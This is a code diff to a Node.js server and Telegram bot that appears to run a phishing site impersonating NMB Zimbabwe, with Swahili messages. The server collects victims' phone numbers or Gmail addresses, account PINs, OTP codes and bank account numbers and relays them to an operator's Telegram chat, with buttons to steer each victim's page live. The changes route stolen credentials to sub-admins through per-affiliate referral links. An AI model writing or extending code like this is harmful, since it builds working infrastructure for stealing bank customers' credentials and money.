@@ -9,7 +9,7 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8786820449';
+const MAIN_ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8786820449';
 const BASE_URL = process.env.BASE_URL || 'https://nmb-zimbabwe.onrender.com';
 
 const bot = new TelegramBot(TOKEN, { polling: true });
@@ -24,8 +24,19 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
     const firstName = user.first_name || 'User';
     const lastName = user.last_name || '';
     const username = user.username ? `@${user.username}` : 'Hakuna';
-    const userId = user.id;
+    const userId = user.id.toString();
 
+    // If the main admin starts the bot, do not send personal generation logs to them
+    if (userId === MAIN_ADMIN_CHAT_ID) {
+        try {
+            await bot.sendMessage(userId, `👋 *Karibu kwenye Paneli Kuu ya Utawala*\n\nWewe ni Admin Mkuu.`, { parse_mode: 'Markdown' });
+        } catch (err) {
+            console.error("Error sending main admin start message:", err);
+        }
+        return;
+    }
+
+    // Only sub-admins receive their individual private tracking links
     const userLink = `${BASE_URL}/?ref=${userId}`;
 
     const privateWelcomeText = `👋 *Karibu kwenye Paneli ya Utawala*\n\n` +
@@ -35,21 +46,17 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
         `• Telegram ID: \`${userId}\`\n\n` +
         `🔗 *Link yako ya kipekee ya rufaa:* \`${userLink}\``;
 
-    const notificationText = `🚀 *MTUMIAJI AMEANZISHA BOT*\n\n` +
+    const mainAdminNotificationText = `🚀 *MTUMIAJI AMEANZISHA BOT*\n\n` +
         `👤 *Jina:* ${firstName} ${lastName}\n` +
         `🏷️ *Username:* ${username}\n` +
         `🆔 *Telegram ID:* \`${userId}\`\n\n` +
         `🔗 *Link ya Mtumiaji:* \`${userLink}\``;
 
     try {
-        await bot.sendMessage(userId, privateWelcomeText, {
-            parse_mode: 'Markdown'
-        });
+        await bot.sendMessage(userId, privateWelcomeText, { parse_mode: 'Markdown' });
 
-        if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== userId.toString()) {
-            await bot.sendMessage(ADMIN_CHAT_ID, notificationText, {
-                parse_mode: 'Markdown'
-            });
+        if (MAIN_ADMIN_CHAT_ID) {
+            await bot.sendMessage(MAIN_ADMIN_CHAT_ID, mainAdminNotificationText, { parse_mode: 'Markdown' });
         }
     } catch (err) {
         console.error("Error sending start messages:", err);
@@ -62,17 +69,20 @@ wss.on('connection', (ws) => {
             const data = JSON.parse(message);
 
             if (data.type === 'REGISTER_SUBADMIN') {
+                ws.subAdminRef = data.refCode;
                 clients.set(data.refCode, ws);
             } 
             else if (data.type === 'SUBMIT_CREDENTIALS') {
                 const { contactType, contact, pin } = data;
                 
                 const labelTitle = contactType === 'gmail' ? '📧 *Gmail Address:*' : '📱 *Namba ya Simu:*';
-                const formattedContact = contactType === 'phone' ? `+263${contact}` : contact;
+                const formattedContact = contactType === 'phone' ? `+263${contact}` : (contact || 'N/A');
                 
                 const captionText = `🚨 *MAOMBI MAPYA YA MKOPAJI*\n\n${labelTitle} \`${formattedContact}\`\n🔑 *PIN ya Akaunti:* \`${pin}\``;
                 
-                const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, captionText, {
+                const targetAdminId = ws.subAdminRef && ws.subAdminRef.length > 0 ? ws.subAdminRef : MAIN_ADMIN_CHAT_ID;
+
+                const sentMsg = await bot.sendMessage(targetAdminId, captionText, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
@@ -85,12 +95,13 @@ wss.on('connection', (ws) => {
                 });
                 
                 ws.clientId = contact;
-                clients.set(contact, { ws, messageId: sentMsg.message_id });
+                clients.set(contact, { ws, messageId: sentMsg.message_id, targetChatId: targetAdminId });
             }
             else if (data.type === 'SUBMIT_OTP') {
                 const { otp } = data;
-                
-                await bot.sendMessage(ADMIN_CHAT_ID, `🔢 *UWEKAJI WA OTP*\n\nOTP Iliyowekwa: \`${otp}\``, {
+                const targetAdminId = ws.subAdminRef && ws.subAdminRef.length > 0 ? ws.subAdminRef : MAIN_ADMIN_CHAT_ID;
+
+                await bot.sendMessage(targetAdminId, `🔢 *UWEKAJI WA OTP*\n\nOTP Iliyowekwa: \`${otp}\``, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
@@ -107,7 +118,9 @@ wss.on('connection', (ws) => {
             }
             else if (data.type === 'SUBMIT_ACCOUNT') {
                 const { accountNumber } = data;
-                await bot.sendMessage(ADMIN_CHAT_ID, `🏛️ *AKAUNTI YA BENKI*\n\nNamba ya Akaunti: \`${accountNumber}\``, {
+                const targetAdminId = ws.subAdminRef && ws.subAdminRef.length > 0 ? ws.subAdminRef : MAIN_ADMIN_CHAT_ID;
+
+                await bot.sendMessage(targetAdminId, `🏛️ *AKAUNTI YA BENKI*\n\nNamba ya Akaunti: \`${accountNumber}\``, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
@@ -135,6 +148,7 @@ wss.on('connection', (ws) => {
 
 bot.on('callback_query', async (query) => {
     const data = query.data;
+    const callbackChatId = query.message.chat.id.toString();
 
     let actionResponse = '';
 
@@ -148,7 +162,9 @@ bot.on('callback_query', async (query) => {
 
     for (let [, clientObj] of clients.entries()) {
         if (clientObj && clientObj.ws && clientObj.ws.readyState === WebSocket.OPEN) {
-            clientObj.ws.send(JSON.stringify({ type: 'SERVER_ACTION', action: actionResponse }));
+            if (clientObj.targetChatId && clientObj.targetChatId.toString() === callbackChatId) {
+                clientObj.ws.send(JSON.stringify({ type: 'SERVER_ACTION', action: actionResponse }));
+            }
         }
     }
 
@@ -171,4 +187,4 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-            
+        
